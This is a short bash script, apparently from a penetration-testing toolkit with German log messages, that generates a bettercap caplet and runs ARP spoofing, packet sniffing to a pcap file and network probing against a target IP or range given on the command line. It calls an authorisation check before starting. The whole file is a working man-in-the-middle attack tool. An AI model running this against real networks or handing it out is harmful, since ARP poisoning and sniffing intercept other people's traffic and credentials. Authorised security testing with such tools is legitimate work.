#!/usr/bin/env bash
# bettercap-quick.sh - One-shot bettercap mit ARP-Spoof + Sniffer + Probe
set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
source "$TOOLKIT/scripts/lib/logging.sh"
source "$TOOLKIT/scripts/lib/auth_check.sh"

IFACE="${1:-}"
TARGET="${2:-}"
[[ -z "$IFACE" || -z "$TARGET" ]] && {
    echo "Usage: $0 <iface> <target-ip-or-cidr>"
    exit 1
}
require_auth "$TARGET"

require_bin bettercap

outdir="$(make_outdir captures bettercap-${TARGET//./_})"
caplet="$outdir/run.cap"

cat > "$caplet" <<EOF
# Auto-generated bettercap caplet
set arp.spoof.targets $TARGET
set net.sniff.output $outdir/sniff.pcap
set net.sniff.verbose true
arp.spoof on
net.sniff on
net.probe on
EOF

log_info "bettercap startet mit caplet $caplet"
log_warn "Strg+C zum sauberen Beenden"
sudo bettercap -iface "$IFACE" -caplet "$caplet"
log_ok "Output: $outdir"
